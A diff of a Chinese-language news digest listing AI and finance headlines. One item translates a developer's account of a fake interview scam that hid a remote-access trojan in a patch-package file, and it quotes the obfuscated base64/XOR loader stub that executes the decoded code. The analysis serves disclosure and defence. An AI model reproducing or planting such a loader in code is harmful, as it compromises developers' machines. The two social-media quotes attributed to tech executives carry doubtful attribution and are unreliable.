@@ -1,5 +1,5 @@
-# ForwardPulse 原始情报收割 — 2026-06-28 12:12:50
-# 共计 26 条来自 5 个信息源
+# ForwardPulse 原始情报收割 — 2026-06-28 14:43:08
+# 共计 19 条来自 5 个信息源
 
 [来源: AI_HOT] [分类: 人工智能] [时间: 2026-06-28 10:50]
 标题: Grok 4.5 私测于 SpaceX 和 Tesla，性能接近 Opus
@@ -46,39 +46,9 @@
 链接: https://aihot.virxact.com/items/cmqwju303014msly0vp9nlrjv
 正文: 披露声明 🧠 本文完全由人类撰写：除 IoC（入侵指标）信息外，所有文字均出自人手。由于时间紧迫，借助 Claude 加速了 RAT 分析并构建了 IoC 检测脚本。 我居住在加拿大，因此已将此事报告给相应的加拿大机构（CCCS 等）。携带载荷的图片在 VirusTotal 上未触发任何杀毒引擎。 攻击者的身份是虚构的，但存在同名且与此事无关的个人，他们可能被误认，故本文中已隐去该姓名。 在 Reddit 上，Rust 社区中还有几位用户提到他们也成为了攻击目标。 本周，我险些遭遇一场伪装成面试的诈骗，旨在给我的计算机植入后门。从邮件上下文判断，我推测目标是我在 crates.io 上的软件包。 注：我将其命名为“PinpinRAT”，因为内部字符串中含有该名称，但可能它还有其他名字。我在网上未找到任何其他相关引用。 一周半前，我收到一封来自“D█████ S████”的邮件，自称来自 Lua Ventures——一家我当时并不知已倒闭的新加坡 DeFi 领域风投公司。需要澄清的是：这是一个伪造的身份，该姓名很可能故意选择得与多位真实人物容易混淆。 这封邮件看起来像真邮件，内含一个链接，指向一个略显平淡但看起来真实的 LinkedIn 个人资料。 攻击者甚至还提到了他们的两项投资，这两家公司当时正在寻求顾问服务：Lyrasing 和 Roadpay。搜索这两家公司并未发现明显异常——它们都有一些非常基础的网络存在，但没有任何迹象表明它们是假的，而非仅仅是早期阶段公司。（archive.org 上 roadpay.cc 的快照）。 我们就会议时间来回沟通，最终确定了通话时间。通话本身也并无异常。电话另一端是一位带有德国口音、讲话有些难以理解的男士。他说自己是在旅行途中接听电话，这有点奇怪，但同样不一定是可疑信号。 通话结束后，诱饵来了。一封后续邮件提供了一份“测试”。 到这一步，我只是有点烦，但还没起疑心。我把仓库克隆下来，但真正让我觉得不对劲的第一个信号，是到这里才出现的。 我走运的地方在于：他们发给我的是一个 TypeScript 仓库。我总觉得哪里不对劲。这份说明看起来更像是一份 TypeScript 的面试题，而不是什么架构分析。我决定把这个仓库打个包，扔给 Claude 快速扫描一下——一半是出于谨慎，一半是出于偷懒。 没过多久，它就识别出了一些异常： 值得注意的是，根目录下的 package.json 没有 postinstall/preinstall 钩子——这很有意思，因为他们用了 patch-package，而 patch-package 通常会挂载到 postinstall 上。让我检查一下每个 package.json 里的生命周期脚本，然后审计一下 patch 文件（真正的风险面——patch 可以在 node_modules 中注入任意代码）。 这引起了我的兴趣。我亲自扫描了目录，发现 patches/ 目录的数量多得有点不合理。我检查的前几个 patch 看起来人畜无害，但你可能也猜到了，它们只是想制造噪声，好让真正的恶意负载不被发现。 packages/electron-benchmarks/patches/sumchecker+3.0.1.patch packages/electron-benchmarks/patches/@electron+get+2.0.3.patch packages/electron-benchmarks/patches/extract-zip+2.0.1.patch 在我手动慢慢检查的时候，Claude 识别出了 PinpinRAT 的初步迹象： 我找到了。这是一个恶意负载。它被嵌入在 typescript+5.9.2.patch 文件中——在同一个被伪装成 TypeScript 常规“模块说明符”补丁的内容里——有一段 base64 编码的 blob 自执行混淆存根，被注入到了 _tsc.js 和 typescript.js 这两个文件的最开头： ;;(function(r,k){const d=Buffer.from(r,'base64');for(let i=0;i&lt;d.length;i+=1)d[i]^=k;return new Function('require','Buffer','WebAssembly','process','__dirname',d.toString('utf8'))(require,Buffer,WebAssembly,process,__dirname)})("YWFg...",73)/*12ff4b51*/ void "ticket-harbor-tsc-shim-anchor"; 这段代码解码一个 base64 字符串，用
 
-[来源: AI_HOT] [分类: 人工智能] [时间: 2026-06-27 13:02]
-标题: Runway API 推出广告本地化 Recipe
-链接: https://aihot.virxact.com/items/cmqwe6jrq000isl6uw2i3e6zy
-正文: 广告本地化现已成为 Runway API 中的一个 Recipe。 现在您只需一次 API 调用，即可翻译静态广告和图形资产。 [引用 @runwayml]：Runway 新增功能，您现在可以本地化广告。 输入一张图片，输出任意语言。只需输入一条广告，即可获得面向每个市场的版本。一切只需一键操作。
-
-[来源: AI_HOT] [分类: 人工智能] [时间: 2026-06-27 12:25]
-标题: "Raise Us"启动：前美商务部长与四州合作筹集10亿美元应对AI就业冲击
-链接: https://aihot.virxact.com/items/cmqwclgpa00a0slfd8mlysoe8
-正文: 最有可能用自动化取代你工作的那些公司，现在正资助一项 10 亿美元的计划来对你进行再培训。 托米斯拉夫·贝兹马利诺维奇 Jun 27, 2026 Nano Banana Pro 由 THE DECODER 提供提示 关键要点 美国前商务部长吉娜·雷蒙多创立了一个名为“Raise Us”的无党派组织，旨在帮助美国劳动者为人工智能驱动的经济做好准备。 目标：为再培训和继续教育项目筹集 10 亿美元。目前已确保筹集到其中一半的资金。 大型科技公司正在支持这一努力。亚马逊、Anthropic、微软和 OpenAI 都是支持者，这引发了关于其独立性的明显问题，因为这些公司正是从人工智能广泛普及中受益最大的企业。 美国前商务部长吉娜·雷蒙多和前印第安纳州州长埃里克·霍尔科姆共同发起了“Raise Us”，这是一个由二十多家大型企业和四位州长支持的两党非营利组织。 该组织旨在筹集 10 亿美元，以帮助美国劳动者为人工智能驱动的经济做好准备。雷蒙多将担任首席执行官。作为参照，谷歌、亚马逊、微软和 Meta 今年计划在人工智能上总共花费 7250 亿美元。 “美国在引领全球人工智能竞争方面有一套技术战略，但还没有一套人才战略——没有人才战略，我们就无法领先，”雷蒙多在启动会上表示。“如果我们建造出世界上最好的人工智能系统，却让数百万美国人掉队，那我们什么也没赢到；我们只是把自己的衰落自动化了。” 该组织计划为企业再培训和留任创造新的激励措施，与各州州长共同启动试点项目，并根据雇主不断变化的需求调整培训模式。衡量成功的标准是劳动者能否获得并保住稳定且收入可观的工作。 人工智能领域的竞争对手首次共同资助一项劳动力计划 Raise Us 引人注目之处在于谁在为其买单。根据公告，亚马逊、Anthropic、微软和 OpenAI 基金会都在支持这项计划。雷蒙多表示，这是领先的人工智能开发者首次共同资助一项独立的计划来支持劳动力转型。美国银行是主要赞助商，资助了一个面向先进制造业的学徒项目。 其他支持者包括 ADP、AMD、Autodesk、黑石、思科、Cognizant、德勤、礼来、通用汽车、IBM、万事达卡、ServiceNow、UPS 和 Workday。在公益方面则有：洛克菲勒基金会、Arnold Ventures、Pritzker Traubert 基金会和 Stephen A. Schwarzman 基金会。Raise Us 的目标是筹集10亿美元的多年期承诺捐款。据《纽约时报》报道，目前已锁定5亿美元。 这种资金结构自然会引发关于独立性的疑问。参与的许多公司要么直接从人工智能的快速普及中获利，要么正在积极推动这一进程。Raise Us 本应为人工智能可能导致的失业问题开发解决方案，但其资金主要来源于那些正是引发这一冲击的公司。 试点项目在四个州启动 Raise Us 首先在阿肯色州、康涅狄格州、马里兰州和犹他州建立合作伙伴关系。选择这些州有意体现了跨党派特色：州长包括 Sarah Huckabee Sanders（共和党，阿肯色州）和 Spencer Cox（共和党，犹他州），以及 Ned Lamont（民主党，康涅狄格州）和 Wes Moore（民主党，马里兰州）。 这些试点项目重点在于促进职业转型，帮助人们了解哪些岗位仍有需求、这些工作需要哪些技能，以及如何转入这些岗位。在阿肯色州，Raise Us 正在支持一个名为 Arkansas LAUNCH 的人工智能驱动的职业导航平台，该平台将学生和求职者与个性化学习路径以及与企业关联的职业轨道路径连接起来。 据《纽约时报》报道，在马里兰州，该州面向高中应届毕业生的 Service Year 项目将扩展到医疗保健等面临劳动力短缺的行业。该组织还计划在当地设立一个面向创新职业转型模式的竞争性资金池，并设立一个加速器项目，帮助失业人员自主创业。 据《纽约时报》报道，在其他州，Raise Us 希望为那些接受低薪工作而非完全退出劳动力队伍的劳动者提供"工资保险"。 该组织的工作围绕四大支柱展开 Raise Us 分为四个领域。“州级合作伙伴关系”旨在通过学徒制和短期证书等方式，使州教育与劳动力项目更紧密地对接雇主需求。公共资金将更多地取决于参与者是否实际找到工作，而不仅仅是入学人数。 “雇主联盟”汇集了使用人工智能的企业，共同开发再培训和留任的试点项目。据《纽约时报》报道，微软已经测试了一种模式：该公司培训跨部门的初级法律人员，并教授他们AI技能，以便他们能在技术变革时更容易地转向新岗位。“几乎我们所有的岗位都可以这样做，”微软副董事长布拉德·史密斯表示。 “教育与培训”旨在推广AI驱动的培训模式，将实践经验与证书相结合，并提供比传统大学更便宜的替代方案。“政策实验室”将开发和测试新的政策方法。该实验
-
-[来源: Yahoo_Finance] [分类: 股票基金] [时间: 2026-06-27 12:30]
-标题: The top 10 wealthiest US suburbs have average incomes as high as $612K, but experts warn they're magnets for crime
-链接: https://finance.yahoo.com/real-estate/articles/top-10-wealthiest-us-suburbs-123000510.html
-
-[来源: Yahoo_Finance] [分类: 股票基金] [时间: 2026-06-27 12:45]
-标题: Why OpenAI’s Delayed IPO Filing May Have Just Been the Death Knell for AI Stocks in 2026
-链接: https://finance.yahoo.com/markets/stocks/articles/why-openai-delayed-ipo-filing-124501701.html
-
-[来源: Yahoo_Finance] [分类: 股票基金] [时间: 2026-06-27 13:00]
-标题: Court appoints receiver for Golub, BlueFive’s Mag Mile office
-链接: https://finance.yahoo.com/real-estate/articles/court-appoints-receiver-golub-bluefive-130000780.html
-
-[来源: Yahoo_Finance] [分类: 股票基金] [时间: 2026-06-27 13:00]
-标题: ‘A paycheck is not the key to independence’: Nearly 1 in 3 young adults still live at home — and most of them have jobs
-链接: https://finance.yahoo.com/real-estate/articles/paycheck-not-key-independence-nearly-130000894.html
-
-[来源: Yahoo_Finance] [分类: 股票基金] [时间: 2026-06-27 13:00]
-标题: Amazon Stock Fans Can Thank Gen AI for a Successful Prime Day, New Data Shows
-链接: https://finance.yahoo.com/markets/stocks/articles/amazon-stock-fans-thank-gen-130002671.html
-
-[来源: Yahoo_Finance] [分类: 股票基金] [时间: 2026-06-27 13:00]
-标题: A $2.7 Trillion Reason Intel Stock Just Got a New Street-High Price Target
-链接: https://finance.yahoo.com/markets/stocks/articles/2-7-trillion-reason-intel-130002280.html
+[来源: Yahoo_Finance] [分类: 股票基金] [时间: 2026-06-28 14:02]
+标题: Australia's Firmus Technologies strikes AI access deal with Nvidia
+链接: https://finance.yahoo.com/technology/ai/articles/australias-firmus-technologies-strikes-ai-140253776.html
 
 [来源: Yahoo_Finance] [分类: 股票基金] [时间: 2026-06-28 10:00]
 标题: HELOC and home equity loan rates Sunday, June 28, 2026: See the best HELOC and HEL lenders for June '26
@@ -96,6 +66,11 @@
 标题: Best high-yield savings interest rates today, Sunday, June 28, 2026: Earn up to 4.10% APY
 链接: https://finance.yahoo.com/personal-finance/banking/article/best-high-yield-savings-interest-rates-today-sunday-june-28-2026-earn-up-to-410-apy-100000604.html
 
+[来源: CNBC_Markets] [分类: 股票基金] [时间: 2026-06-28 12:23]
+标题: These 10 Chinese stocks are powering U.S. data centers
+链接: https://www.cnbc.com/2026/06/28/these-10-chinese-stocks-are-powering-us-data-centers.html
+正文: Many of the top-performing mainland Chinese stocks this year make components used in data centers globally, according to 22V Research.
+
 [来源: CNBC_Markets] [分类: 股票基金] [时间: 2026-06-27 15:00]
 标题: Why investors may want to prioritize bond markets outside the U.S.
 链接: https://www.cnbc.com/2026/06/27/inflation-as-major-reason-to-invest-in-global-bond-markets.html
@@ -106,15 +81,10 @@
 链接: https://www.cnbc.com/2026/06/26/spacex-added-to-nasdaq-100.html
 正文: Adding SpaceX this quickly would make the Elon Musk company one of the first beneficiaries of Nasdaq's recently adopted fast-track inclusion framework.
 
-[来源: CNBC_Markets] [分类: 股票基金] [时间: 2026-06-27 12:22]
-标题: Jeremy Grantham says, 'This is the most expensive market in American history'
-链接: https://www.cnbc.com/2026/06/26/jeremy-grantham-says-this-is-the-most-expensive-market-in-american-history.html
-正文: Jeremy Grantham says soaring valuations around AI makes the U.S. stock market historically expensive.
-
-[来源: X/@sama] [分类: 人工智能] [时间: 2026-06-28 12:12]
+[来源: X/@sama] [分类: 人工智能] [时间: 2026-06-28 14:43]
 标题: Sam Altman: AGI timeline keeps accelerating
 正文: Just had a look at our latest internal benchmarks. The gap between current models and human-level reasoning on complex tasks is closing faster than any of our 2024 projections suggested. We might need to revisit what "AGI" even means before we get there.
 
-[来源: X/@elaboratepool] [分类: 人工智能] [时间: 2026-06-28 12:12]
+[来源: X/@elaboratepool] [分类: 人工智能] [时间: 2026-06-28 14:43]
 标题: Satya Nadella: The next platform shift is embodied AI
 正文: We are entering the era where AI doesnt just generate text and images — it manipulates atoms. Robotics foundation models are where LLMs were in 2020. The companies that crack the sim-to-real transfer problem will define the next decade of manufacturing.
